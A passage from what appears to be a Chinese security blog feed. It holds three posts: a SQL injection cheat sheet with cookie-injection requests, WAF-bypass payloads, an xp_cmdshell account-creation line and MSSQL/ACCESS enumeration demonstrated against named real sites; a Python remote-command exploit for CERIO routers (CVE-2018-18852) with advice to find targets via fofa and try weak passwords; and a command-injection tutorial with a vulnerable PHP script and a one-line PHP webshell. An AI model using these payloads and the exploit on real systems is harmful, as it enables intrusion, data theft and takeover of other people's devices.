Cookie is deleted&quot;;                setcookie(&#39;uname&#39;, $row1[&#39;username&#39;], time()-3600);                header (&#39;Location: index.php&#39;);        echo &#39;&lt;/font&gt;&lt;/center&gt;&lt;/br&gt;&#39;;        }                    echo &quot;&lt;br&gt;&quot;;            echo &quot;&lt;br&gt;&quot;;            //header (&#39;Location: main.php&#39;);            echo &quot;&lt;br&gt;&quot;;            echo &quot;&lt;br&gt;&quot;;            //echo &#39;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&lt;/center&gt;&#39;;            //logging the connection parameters to a file for analysis.            $fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);        fwrite($fp,&#39;Cookie:&#39;.$cookee.&quot;\n&quot;);        fclose($fp);}?&gt;&lt;/body&gt;&lt;/html&gt;对username和password进行了严格的过滤和去除了反斜杆几乎不存在注入但是带入cookie进行查询的时候没有做好对应的过滤措施，导致SQL注入的发送POST /Less-20/index.php HTTP/1.1Host: 118.24.125.87:8000Content-Length: 0Cache-Control: max-age=0Origin: http://118.24.125.87:8000Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0Content-Type: application/x-www-form-urlencodedAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Referer: http://118.24.125.87:8000/Less-20/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8Cookie:  uname=admin&#39; and updatexml(1,concat(0x7e,(select user()),0x7e),1) and &#39;1&#39;=&#39;1Connection: close返回：HTTP/1.1 200 OKDate: Thu, 17 Jan 2019 05:37:48 GMTServer: Apache/2.4.7 (Ubuntu)X-Powered-By: PHP/5.5.9-1ubuntu4.13Vary: Accept-EncodingContent-Length: 1028Connection: closeContent-Type: text/html&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;title&gt;Less-20 Cookie Injection- Error Based- string&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=&quot;#000000&quot;&gt;&lt;center&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;img src=&quot;../images/Less-20.jpg&quot; /&gt;&lt;br&gt;&lt;br&gt;&lt;b&gt;&lt;br&gt;&lt;font color= &quot;red&quot; font size=&quot;4&quot;&gt;YOUR USER AGENT IS : Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0&lt;/font&gt;&lt;br&gt;&lt;font color= &quot;cyan&quot; font size=&quot;4&quot;&gt;YOUR IP ADDRESS IS : 113.77.238.53&lt;/font&gt;&lt;br&gt;&lt;font color= &quot;#FFFF00&quot; font size = 4 &gt;DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE &lt;br&gt;&lt;font color= &quot;orange&quot; font size = 5 &gt;YOUR COOKIE : uname = admin&#39; and updatexml(1,concat(0x7e,(select user()),0x7e),1) and &#39;1&#39;=&#39;1 and expires: Thu 17 Jan 2019 - 06:37:48&lt;br&gt;&lt;/font&gt;Issue with your mysql: XPATH syntax error: &#39;~root@localhost~&#39;</code></pre><p>Referer和headers头部注入也是类似于cookie注入的原因而导致的注入，这里就略过不说了</p><p>闭合注入<br>如果注入点类似于在</p><pre><code>select * from user where username=&#39;username&#39;</code></pre><p>那么就要对注入语句进行闭合<br>常见的闭合<br>注意 </p><pre><code>这里的%7c为|</code></pre><table><thead><tr><th>SQL查询语句</th><th>闭合注入语句</th></tr></thead><tbody><tr><td>select * from users where username=’$u’;</td><td>‘ and 1=2 # 或 ‘ and 1=2 and ‘1’=’1 或 and 1=2 %7c’1</td></tr><tr><td>select * from users where usersname=”$U”;</td><td>“and 1=2 –+ 或 “ and 1=2 and “1”=”1 或 and 1=2 %7c”1</td></tr><tr><td>select * from users where username=(“$u”);</td><td>“) and 1=2 –+ 或 “) and 1=2 and (“1”)=(“1 或 and 1=2 %7c(“1</td></tr></tbody></table><p>base64注入</p><p>将变量进行了base64编码，到后端处理代码在进行base64解码然后在带入数据库中查询</p><p>实例：</p><p><a href="http://www.ccctawau.org/eventinfo.php?id=MTM=" target="_blank" rel="noopener">斗湖中华商会</a></p><pre><code>仅供测试使用，若是想蹲监与作者无关</code></pre><p><img src="https://s2.ax1x.com/2019/01/31/k1akSs.md.png" alt="k1akSs.md.png"></p><pre><code>http://www.ccctawau.org/eventinfo.php?id=MTM=</code></pre><p>明显的base64加密，解密看看？<br><img src="https://s2.ax1x.com/2019/01/31/k1amwT.png" alt="k1amwT.png"></p><p>尝试注入<br><img src="https://s2.ax1x.com/2019/01/31/k1aMY4.png" alt="k1aMY4.png"></p><p>and 1=2返回了错误<br><img src="https://s2.ax1x.com/2019/01/31/k1a1p9.md.png" alt="k1a1p9.md.png"></p><p>and 1=1返回了正常<br><img src="https://s2.ax1x.com/2019/01/31/k1a3lR.png" alt="k1a3lR.png"></p><p>注入带走<br><img src="https://s2.ax1x.com/2019/01/31/k1awfH.md.png" alt="k1awfH.md.png"></p><h4 id="绕过过滤注入"><a href="#绕过过滤注入" class="headerlink" title="绕过过滤注入"></a>绕过过滤注入</h4><pre><code>1.先判断他过滤了什么2.能否通过切割关键字绕过3.能否通过代替关键字绕过</code></pre><p>注入常遇见的WAF：</p><pre><code>WTS-WAF安全狗D盾云锁</code></pre><p>前两种比较好绕过，后面两种本人没成功过= =</p><p>常见的绕过语句：</p><pre><code>对参数名进行url编码http://127.0.0.1/sql.php?%69d=1对参数值进行url编码http://127.0.0.1/sql.php?id=1%20%61%6E%64%20%31%3D%32对参数值进行双重编码http://127.0.0.1/sql.php?id=1%25%32%30%25%36%31%25%36%45%25%36%34%25%32%30%25%33%31%25%33%44%25%33%32单引号的一些编码：%u0027%u02b9%u02bc%u02c8%u2032%uff07%c0%27%c0%a7%e0%80%a7星号的一些编码：%u002a%uff0a%c0%2a%c0%aa%e0%80%aa使用 Mysql 内置函数 char（）。示例代码:char(114)=&#39;r&#39;1.3 使用 Mysql 内置函数 HEX（）,UNHEX(). ,UNHEX(). ,UNHEX(). ,UNHEX().示例代码：通过 str 获取 hex 值:select hex(&quot;root&quot;) 返回结果:726F6F74通过 hex 获取 str:select unhex( &quot;726F6F74&quot; ) 返回结果: root比如:当关键字 root 被过滤时可以用 0x726F6F74 代替 rootbase64变形注入，通过base64编码引发的注入http://127.0.0.1/sql.php?id=1http://127.0.0.1/sql.php?id=MSBhbmQgMT0y判断注入点的姿势id=1+OR+0x50=0x50id=1+and+5!=6And 0 (false)And 1 (true)And (true)And (false)&#39;/*!or*/1=&#39;1or 1=1;%00and 1=1&amp;&amp;2=2or 3=3Xor 4=4Xor 5 LIKE 5or 6 rLiKE 6|| 3&gt;2&amp;&amp; 3&lt;7AnD is nullAnD is not nulland &#39;0having&#39;=&#39;0having&#39;and 1=&#39;1替换空格/**/+%20&#39;%01&#39;, &#39;%02&#39;, &#39;%03&#39;, &#39;%04&#39;, &#39;%05&#39;, &#39;%06&#39;, &#39;%07&#39;, &#39;%08&#39;, &#39;%09&#39;, &#39;%0B&#39;, &#39;%0C&#39;, &#39;%0D&#39;, &#39;%0E&#39;, &#39;%0F&#39;,&#39;%0A&#39;--%0A%23%0A%23PTTmJopxdWJ%0A%23cWfcVRPV%0A‘or+(1)sounds/**/like“1“–%a0-‘union(select(1),tabe_name,(3)from`information_schema`.`tables`)#(0)union(select(table_name),column_name,…0%a0union%a0select%09group_concat(table_name)….?id=(case(substr((select(group_concat(table_name))from(information_schema.tables)),1,1))when(0x61)then(1)else(2)end)?id=(0)union(select(table_name),column_name,(0)from(information_schema.columns)having((table_name)like(0x7573657273)))#?id=if((select(count(*))from(information_schema.columns))=187,1,2)用过多个空格替换&quot; &quot;=&gt;&quot; &quot;用%bf%27 代替单引号PostgreSQL 可以用$$代替单引号来突破防注入可以达到相似目的的 Mysql 函数substring() mid() substr()ascii() hex() bin() ord()benchmark() sleep()没有where如何注入：源语句：select user from users where user=&quot;admin&quot;;没有where语句：select user from users group by user having user=&quot;admin&quot;;没有union：and (select passfrom userslimit 1)=’secretAnd exists (select * fromuser limit 1)=’admin没有limit select pass from users where 1 没有group select substr(user,1) from users //直接爆出全部内容 select substr(user,1,1) from users //爆出全部的第一个字符 第二个1可以改为你要爆出的字符长度 select substr(user,1,20) from users 没有having select group_concat(user) from users select max(user) from users select max(replace(user,&#39;第一个获取到的内容&#39;,&#39;&#39;)) from users; //这个依次替换文字的地方就能获取所有内容 没有 select‘ andsubstr(load_file(‘file’),locate(‘DocumentRoot’,(load_file(‘file’)))+length(‘DocumentRoot’),10)=’a‘=” into outfile ‘/var/www/dump.txt 没有and http://www.ryowa-ceramic.com/company.php?id=if(1=1,(1=1),1) //返回正常 http://www.ryowa-ceramic.com/company.php?id=if(1=1,(1=2),1)  //返回错误 没有 or1 || substr(user,1,1) = &#39;a&#39;1 || substr(user,1,1) = unhex(61)1 || substr(user,1,1) = lower(conv(11,10,36))1 || lpad(user,7,1)1%0b||%0blpad(user,7,1)突破 preg_replace preg_replace preg_replace preg_replacehttp://localhost/sqli.php?id=1+UNunionION+SEselectLECT+1,2,3-- 多参数处理规则：  web 服务器 | 参数的处理方式 | 例子 |+--------------------------------------------------------------------------------+| ASP.NET/IIS | 用逗号隔开 | par1=val1,val2 || ASP/IIS | 用逗号隔开 | par1=val1,val2 || PHP/Apache | 取最后一个参数的值 | par1=val2 || JSP/Tomcat | 取第一个参数的值 | par1=val1 || Perl/Apache | 取第一个参数的值 | par1=val1打碎关键字使用%打碎关键字 http://127.0.0.1/sql.php?id=1 u%onion s%e%l%e%c%t 1,2,3 通过注释符号打碎关键字（不适用于MYSQL&gt;4.1的情况） http://127.0.0.1/sql.php?id=1 un/**/ion se/**/lect 1,2,3 使用%0b打碎关键字 http://127.0.0.1/sql.php?id=1 un%0bion se%0blect 1,2,3 使用%0f打碎关键字 http://127.0.0.1/sql.php?id=1 uni%6fn 更改请求方式cookie注入示例代码：javascript:alert(documnet.cookie=&quot;id&quot;+escpace(&quot;51 and 1=1&quot;));更改method为postweb服务器和WAF对一些字符的处理+-----------------------------------------------------------+| | Apache/2.2.16, PHP/5.3.3 | IIS6/ASP |+-----------------------------------------------------------+| ?test[1=2 | test_1=2 | test[1=2 || ?test=% | test=% | test= || ?test%00=1 | test=1 | test=1 || ?test=1%001 | NULL | test=1 || ?test+d=1+2 | test_d=1 2 | test d=1 2 |+----------------------------------------------------------------------++-------------------------------------------------------------------- --------+| Keywords | WAF | ASP/ASP.NET |+-----------------------------------------------------------------------------+| sele%ct * fr%om.. | sele%ct * fr%om.. | select * from.. || ;dr%op ta%ble xxx | ;dr%op ta%ble xxx | ;drop table xxx || &lt;scr%ipt&gt; | &lt;scr%ipt&gt; | &lt;script&gt; || &lt;if%rame&gt; | &lt;if%rame&gt; | &lt;iframe&gt; |+-----------------------------------------------------------------------------+突破安全狗安全狗本 身对 xx.asp?id=69 and 1=1 和 xx.asp?id=69 and 1=2 这些是过 滤的，可是对xx.asp?sqli.com=%00.&amp;xw_id=69%20 and 1=1 和 xx.asp?sqli.com=%00.&amp;xw_id=69%20 and1=2 却是正常，直接丢到工具就 OK 了缓冲区溢出突破用 C 语言编写的 WAF示例代码：http://localhost/sqli.php?id=1+and+(select 1)=(select0x414141414141441414141414114141414141414141414141414141414141414141?.)+union+select+1,2,version(),database(),user(),6,7,8,9,10--组合攻击asp 和 asp.net 的 Request 对象存在一个包解析漏洞，Request 对象对于 GET 和 POST 包的解析过于宽松，用一句话表达就是 Request 对象它 GET 和 POST 傻傻分不清楚，稍有点 web开发经验的同学应该知道 Request 接收 GET,POST,COOKIE 也就是 GPC 传过来的数据，但是 asp 和.net 库内置的 Request 对象完全不按 RFC 标准来，下面我们可以做个测试：我们发送的原始包是：GET /1.asp HTTP/1.1Host: 192.168.239.129Content-Length: 34Content-Type: application/x-www-form-urlencodedt=’/**/or/**/1=1–结果返回如下：Request:’/**/or/**/1=1–将 python 测试脚本的 path 改为/1.aspx 测试页返回同样结果。我们可以看到这是一个畸形的 HTTP GET 请求包，这个包的奥秘在于 t=’/**/or/**/1=1–参数后的 8 个回车换行和 Content-Length 头，包的结构类似于一个 POST 包，而请求的方法是GET,最后 asp 和 asp.net 的 Request 对象成功的解析了这个畸形包取出了数据。所以如果 WAF 没有处理好 HTTP 包的内容，沿用常规思路处理 GET 和 POST 的逻辑的话，那么这个畸形包将会毁掉 WAF 的基础防御。关键字的大小写转换SelECtUnIoNFroMUnioN AILGrOuP_ConCAt()/**/为注释/*!*/执行/*!*/里面的内容（遇狗可借鉴下面的操作）对参数值进行污染处理localhost/sqli.php?id=123 uNiOn All sEleCt/*We are bypassing the WAF*/select/*Rafay HackingArtcles*/1,2,3,4,5--0/**/union/*!50000select*/table_name`foo`/**/…http://localhost/sqli.aspx?q=select/*&amp;q=*/name&amp;q=password/*&amp;q=*/from/*&amp;q=*/usershttp://localhost/sqli.aspx?id=1&#39;; /*&amp;id=1*/ EXEC /*&amp;id=1*/ master..xp_cmdshell/*&amp;id=1*/ ?net user lucifer UrWaFisShiT? /*&amp;id=1*/ --/?id=1/*union*/union/*select*/select+1,2,3/*id=1+union/*&amp;name=*/select+1,2 （存在参数 name）http://www.f4le.com/member/ajax_membergroup.php?[url=mailto:00.&amp;action=post&amp;membergroup=@%60]action=post&amp;membergroup=@`&#39;[/url]` Union select pwd from `%23@__admin` where1 or id=@`&#39;`http://www.f4le.com/member/ajax_membergroup.php?0dayf4le.com=%[url=mailto:00.&amp;action=post&amp;membergroup=@`]00.&amp;action=post&amp;membergroup=@`&#39;[/url]` Union select pwd from`%23@__admin` where 1 or id=@`&#39;`group_concat()的 1024 chars 的解决方案select group_concat(substr(user,1,1)) from users; //取从第一个字符到第一个字符select group_concat(substr(user,1,5)) from users; //取从第一个字符到第五个字符查询语句写到注释当中http://127.0.0.1/sql.php? /*!union*/**/*!select 1,user(),database()*/http://127.0.0.1/sql.php?/*dsadsasdd*/*!and*/*The is by pass*/*!1=2*/注释符%23 （#的url编码）[建议养成使用%23的习惯]-- (后面有个空格所有建议直接使用--+)/**/%00(在MS access当中可以当注释符号来用)突破防注入代码小抄%00&#39; UNION SELECT password FROM Users WHERE username=&#39;admin&#39;--+IFNULL(1, 2) 可以改写成 IF(ISNULL(1), 2, 1)0′union all select all`table_name`foo from`information_schema`. `tablesvalue&#39;/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)), NULL, NULL#/*!0AND &#39;QDWa&#39;=&#39;QDWaSELECT * FROM users WHERE id LIKE 1SELECT FIELD%20FROM TABLE 可以写成%u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045&#39;A&gt; B&#39;可以写成 &#39;ANOT BETWEEN 0 AND B&#39;1&#39; AND SLEEP(5)# 可以写成 MScgQU5EIFNMRUVQKDUpIw==AND &#39;1&#39;=&#39;1&#39; 可以写成 AND %EF%BC%871%EF%BC%87=%EF%BC%871%EF%BC%87load_file/*foo*/(0×616263)http://localhost/sqli.php?id=0+div+1+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1%2C2%2Ccurrent_userhttp;//127.0.0.1/1.asp?id=(1)anandd(1=1)试试不要用 /etc/passwd. 用 /foo/../etc/bar/../passwd.Dumpfile 虽然只能导出一行数据，但必要时还是应该可以拿来和 outfile 换一下的一些mysql函数substr(‘abc’,1,1) = ‘a’substr(‘abc’ from 1 for 1) = ‘a’substring(‘abc’,1,1) = ‘a’substring(‘abc’ from 1 for 1) = ‘a’mid(‘abc’,1,1) = ‘a’mid(‘abc’ from 1 for 1) = ‘a’lpad(‘abc’,1,space(1)) = ‘a’rpad(‘abc’,1,space(1)) = ‘a’left(‘abc’,1) = ‘a’reverse(right(reverse(‘abc’),1)) = ‘a’insert(insert(‘abc’,1,0,space(0)),2,222,space(0)) = ‘a’space(0) = trim(version()from(version()))locate(‘a’,&#39;abc’)position(‘a’,&#39;abc’)position(‘a’ IN ‘abc’)instr(‘abc’,&#39;a’)substring_index(‘ab’,&#39;b’,1)length(trim(leading ‘a’ FROM ‘abc’))length(replace(‘abc’, ‘a’, ”))strcmp(‘a’,&#39;a’)mod(‘a’,&#39;a’)find_in_set(‘a’,&#39;a’)field(‘a’,&#39;a’)count(concat(‘a’,&#39;a’))length()bit_length()char_length()octet_length()bit_count()姿势大全新姿势 1:strcmp(left(&#39;password&#39;,1), 0x69) = 1strcmp(left(&#39;password&#39;,1), 0x70) = 0strcmp(left(&#39;password&#39;,1), 0x71) = -1变换姿势: /*mid()函数用于得到字符串的一部分*/select user from mysql.user where user = &#39;user&#39; OR mid(password,1,1)=&#39;*&#39;  //获取user表中字段的&#39;user&#39;然后输出字段内容里面有个*的select user from mysql.user where user = &#39;user&#39; OR mid(password,1,1)=0x2aselect user from mysql.user where user = &#39;user&#39; OR mid(password,1,1)=unhex(&#39;2a&#39;)select user from mysql.user where user = &#39;user&#39; OR mid(password,1,1) regexp &#39;[*]&#39;select user from mysql.user where user = &#39;user&#39; OR mid(password,1,1) like &#39;*&#39;select user from mysql.user where user = &#39;user&#39; OR mid(password,1,1) rlike &#39;[*]&#39;select user from mysql.user where user = &#39;user&#39; OR ord(mid(password,1,1))=42select user from mysql.user where user = &#39;user&#39; OR ascii(mid(password,1,1))=42select user from mysql.user where user = &#39;user&#39; OR find_in_set(&#39;2a&#39;,hex(mid(password,1,1)))=1select user from mysql.user where user = &#39;user&#39; OR position(0x2a in password)=1select user from mysql.user where user = &#39;user&#39; OR locate(0x2a,password)=1select user from mysql.user where user = &#39;user&#39; OR substr(password,1,1)=0x2aselect user from mysql.user where user = &#39;user&#39; OR substring(password,1,1)=0x2a新姿势 2:false !pi() 0 ceil(pi()*pi()) 10 A ceil((pi()+pi())*pi()) 20 Ktrue !!pi() 1 ceil(pi()*pi())+true 11 B ceil(ceil(pi())*version()) 21 Ltrue+true 2 ceil(pi()+pi()+version()) 12 C ceil(pi()*ceil(pi()+pi())) 22 Mfloor(pi()) 3 floor(pi()*pi()+pi()) 13 D ceil((pi()+ceil(pi()))*pi()) 23 Nceil(pi()) 4 ceil(pi()*pi()+pi()) 14 E ceil(pi())*ceil(version()) 24 Ofloor(version()) 5 ceil(pi()*pi()+version()) 15 F floor(pi()*(version()+pi())) 25 Pceil(version()) 6 floor(pi()*version()) 16 G floor(version()*version()) 26 Qceil(pi()+pi()) 7 ceil(pi()*version()) 17 H ceil(version()*version()) 27 Rfloor(version()+pi()) 8 ceil(pi()*version())+true 18 I ceil(pi()*pi()*pi()-pi()) 28 Sfloor(pi()*pi()) 9 floor((pi()+pi())*pi()) 19 J floor(pi()*pi()*floor(pi())) 29 T</code></pre><p>其他数据库类型注入：<br>ACCESS注入语句：</p><pre><code class="sql">and exists(select * from msysobjects) /*返回错误页面或返回无权限读取代表是Access数据库*/and exists(select * from admin) /*admin为表名，让你猜表名*/and exists(select username from admin) /*username为列名,让你猜列名*/order by 8 /*猜解字段长度*/将id改为0 union select 1,2,3,4,5,6,7,8 from admin /*获取位置*/union select 1,username,password,4,5,6,7,8 from admin /*读字段*/</code></pre><p>ACCESS盲注:</p><pre><code class="sql">判断是否有注入就不说了and exists(select * from msysobjects) /*500状态码或报无权限读取代表是Access数据库*/and exists(select * from admin) /*admin是你要猜解的表名*/and exists(select username from admin) /*username是你要猜解的列名*/and (select top 1 len(username) from admin)&gt;1 /*top 1 len(你要猜解列名的长度),1代表长度,直到报错的第一个*/例子：and (select top1 len(username) from admin)&gt;4 /*正确*/and (select top 1 len(username) from admin)&gt;5 /*错误*/ 那么长度为5，第一个错误就是长度and(select top 1 asc(mid(username,1,1)) from admin)=97 /*username为你要猜解的列名，1为长度，如果上一步为5这里最高是5,97位ascii码,通过ascii来猜解字段*/</code></pre><p>MSSQL注入</p><pre><code class="sql">mssql是sql server，也是微软推出的大型数据库。MSSQL权限:sa权限:数据库管理，文件管理，命令执行，注册表，systemdb权限:文件管理，数据库操作等，users-administratorspublic权限:数据库操作， guest-users注入语句:判断有没有注入&#39;and 1=1and 1=2初步判断是否mssqland user&gt;0判断数据库系统and (select count(*)from sysobjects)&gt;0 //mssql注释:诺是报错或者权限不足无法查看就是mssql数据库了查看数据库版本信息：and 1=(select @@version)查看数据库的语句：and 1=(select db_name())获取第一个用户数据库：and 1=(select top 1 name from master..sysdatabases where bdid&gt;4)获取下一个数据库：and 1=(select top 1 name from master ..sysdatabases where bdid&gt;4 and name&lt;&gt;&#39;数据库名&#39;) //以此类推可以获取全部数据库名获取表：and 1=(select top 1 name from sysobjects where xtype=&#39;u&#39;获取第二张表: and 1=(select top 1 name from sysobjects where xype=&#39;||&#39; and name &lt;&gt; &#39;第一张表名&#39;)获取第三张表：and 1=(select top 1 name from sysobjects where xyoe=&#39;||&#39; and name &lt;&gt; &#39;第一张表名&#39; and name &lt;&gt; &#39;第二张表名&#39;)获取N张表以此类推可以获取所有表。。。获取某表的列名：and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name=&#39;表名&#39;))获取第二个列名：and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name=&#39;表名&#39;)) and name &lt;&gt; &#39;第一个列名&#39;获取N个列名以此类推可以获取所有列名。。。获取列里面的数据：and 1=(select top 1 列名 from 表名 )要查询其他的改为对应的就ok</code></pre><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CVE-2018-18852 recurrence</title>
      <link href="/posts/4e5e3ee5.html"/>
      <url>/posts/4e5e3ee5.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这个洞出来也有几天了，详情自行google。这里我手动撸了一个py3的脚本，github上的exp是py2写的<br><img src="http://p3.pstatp.com/large/pgc-image/152580921656618a2da3aff" alt="152580921656618a2da3aff"></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>漏洞详情：<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-18852" target="_blank" rel="noopener">CVE - CVE-2018-18852</a><br>exp：<a href="https://github.com/hook-s3c/CVE-2018-18852" target="_blank" rel="noopener">GitHub - hook-s3c/CVE-2018-18852: CERIO RCE CVE-2018-18852, authenticated (vendor defaults) web-based RCE as root user.</a><br>利用方法：上fofa搜关键字：CERIO DT-300N，尝试弱口令，然后如果是弱口令的话扔exp里面执行<br>声明：如果你想蹲监的话，本人不负责</p><p><b>exp脚本分析</b></p><pre><code>1.首先判断是cerio的那个版本2.确定版本后获取PID值3.构造一个payload远程执行命令</code></pre><p>随便找一个是弱口令的IP<br><img src="https://s2.ax1x.com/2019/01/30/klt8v6.png" alt="klt8v6.png"></p><p>代码如下：</p><pre><code>#author:九世#time:2019/1/30import requestsimport jsonimport base64class Demo:    def __init__(self,headers,url,payload,url2):        self.headers=headers        self.url=url        self.payload=payload        self.url2=url2    def requet(self):        ver = &#39;DT-300N-NGS-M&#39;        ver2=&#39;DT-300N&#39;        version=&#39;&#39;        vurl=&#39;&#39;        rqt=requests.post(url=self.url,headers=self.headers,data=self.payload)        nurl=&#39;&#39;        nersion=&#39;&#39;        if rqt.status_code==requests.codes.ok:            print(&#39;[+] Router version number is {}&#39;.format(ver))            while True:                rqt = requests.post(url=self.url, headers=self.headers, data=self.payload)                nurl+=rqt.url                nersion+=ver                nary=json.loads(rqt.content)                cmd = input(&#39;command：&#39;)                payload = {&#39;ip&#39;: &#39;127.0.0.1;&#39; + &#39;echo &quot;[[[&quot;;&#39; + cmd, &#39;pid&#39;: nary[&#39;pid&#39;], &#39;Times&#39;: 1}                self.command(self.url, headers, payload,nersion)        elif rqt.status_code==requests.codes.not_found: #判断状态码是否为404            print(&#39;[-] Router version number is not {}&#39;.format(ver))            rqts=requests.post(url=self.url2,headers=headers,data=self.payload)            if rqts.status_code==requests.codes.ok:                print(&#39;[+] Router version number is {}&#39;.format(ver2))                while True:                    rqts = requests.post(url=self.url2, headers=headers, data=self.payload)                    version+=ver2                    vurl+=rqts.url                    vary=json.loads(rqts.content)                    cmd=input(&#39;command：&#39;)                    payload = {&#39;ip&#39;: &#39;127.0.0.1;&#39; + &#39;echo &quot;[[[&quot;;&#39; + cmd, &#39;pid&#39;: vary, &#39;Times&#39;: 1}                    self.command(self.url2,headers,payload,version)            elif rqts.status_code==requests.codes.not_found:                print(&#39;[-] Router version number is not {}&#39;.format(ver2))                exit()            elif rqts.status_code==requests.codes.unauthorized:                print(&#39;[-] Auth is invalid, try other creds&#39;)                exit()    def command(self,url,header,data,ver):        rsv=requests.post(url=url,headers=header,data=data)        if ver==&#39;DT-300N&#39;:            print(rsv.text.split(&#39;/html&#39;)[1])        else:            print(rsv.text.split(&#39;[[[&#39;)[1])if __name__ == &#39;__main__&#39;:    print(&#39;[&amp;]&#39;)    print(&#39;[!] CERIO DT-300N-NGS-M\n[!] CERIO DT-300N&#39;)    print(&#39;&#39;)    t=&#39;&#39;    path=&#39;/cgi-bin/main.cgi?cgi=PING&amp;mode=9&#39;    path2=&#39;/cgi-bin/Save.cgi?cgi=PING&#39;    user=input(&#39;host:&#39;).strip()    ports=input(&#39;port:&#39;).strip()    username=input(&#39;creds:&#39;).strip()    creds=bytes(base64.b64encode(bytes(username,encoding=&#39;utf-8&#39;))).decode(&#39;utf-8&#39;)    if ports in &#39;443&#39;:        t+=&#39;https://&#39;    else:        t+=&#39;http://&#39;    urls=t+user+&#39;:&#39;+ports+path    urls2=t+user+&#39;:&#39;+ports+path2    payload={&#39;cgi&#39;:&#39;PING&#39;,&#39;mode&#39;:9}    headers={&#39;content-type&#39;: &#39;application/json&#39;, &#39;Host&#39;: user, &#39;Accept-Encoding&#39;: &#39;gzip, deflate&#39;,&#39;Content-Length&#39;: &#39;0&#39;, &#39;Connection&#39;: &#39;keep-alive&#39;, &#39;Authorization&#39;: &#39;Basic {}&#39;.format(creds)}    obj=Demo(headers=headers,payload=payload,url=urls,url2=urls2)    obj.requet()</code></pre><p>测试：<br><img src="https://s2.ax1x.com/2019/01/30/kltYDO.png" alt="kltYDO.png"></p><p><img src="https://s2.ax1x.com/2019/01/30/klt0PA.md.png" alt="klt0PA.md.png"></p><p>脚本地址：<a href="https://github.com/422926799/python/tree/master/CVE-2018-18852" target="_blank" rel="noopener">python/CVE-2018-18852 at master · 422926799/python · GitHub</a></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Command injection summary</title>
      <link href="/posts/e2532565.html"/>
      <url>/posts/e2532565.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天把系统重装了一遍，起因经过不想说什么= =。由于下午都在安环境和打补丁，也就只有晚上能学习一下。把命令注入学习总结了一遍<br><img src="http://img.mp.itc.cn/upload/20170204/e5391a3c2cf145b18b5c6b56b7930b20_th.jpeg" alt=""></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p><b>漏洞产生的原因</b><br>由于开发人员使用脚本语言提供的命令执行操作，过滤又不完善用户又可以只有控制输入的变量。导致了变量可控，造成命令注入。</p><p><b>漏洞测试</b><br>测试环境为：win7+php5.6,使用phpstudy搭建<br>存在漏洞的脚本</p><pre><code>&lt;html&gt;&lt;head&gt;    &lt;title&gt;命令注入测试&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;输入IP&lt;/p&gt;&lt;form method=&quot;GET&quot; action=&quot;&lt;?php echo $_SERVER[&#39;PHP_SELF&#39;];?&gt;&quot;&gt;    IP:&lt;input name=&quot;host&quot; type=&quot;text&quot; required&gt;&lt;br&gt;    &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;    &lt;p id=&quot;demo&quot;&gt;我是结果&lt;/p&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;&lt;?phpheader(&quot;Content-type: text/html;charset=utf-8&quot;);if(isset($_GET[&#39;host&#39;])){    $ud=$_GET[&#39;host&#39;];    $zx=system(&quot;ping &quot;.$ud);    echo $zx;    echo &quot;&lt;script&gt;document.getElementById(&#39;demo&#39;).innerText=$zx&lt;/script&gt;&quot;;}?&gt;</code></pre><p>上面这个例子可以看到无任何过滤，输入变量又可控，导致可以被用户任意执行命令<br><img src="https://s2.ax1x.com/2019/01/29/kQ4lSP.png" alt="kQ4lSP.png"><br>输入：</p><pre><code>127.0.0.1&amp;&amp;dir</code></pre><p><img src="https://s2.ax1x.com/2019/01/29/kQ40S0.md.png" alt="kQ40S0.md.png"><br>查看权限：</p><pre><code>127.0.0.1&amp;&amp;whoami</code></pre><p><img src="https://s2.ax1x.com/2019/01/29/kQ4TmD.png" alt="kQ4TmD.png"></p><p>反弹shell</p><pre><code>echo &quot;&lt;?php @assert($_GET[_]);?&gt;&quot; &gt;&gt; zz.php</code></pre><p><img src="https://s2.ax1x.com/2019/01/29/kQ57vV.png" alt="kQ57vV.png"></p><p><img 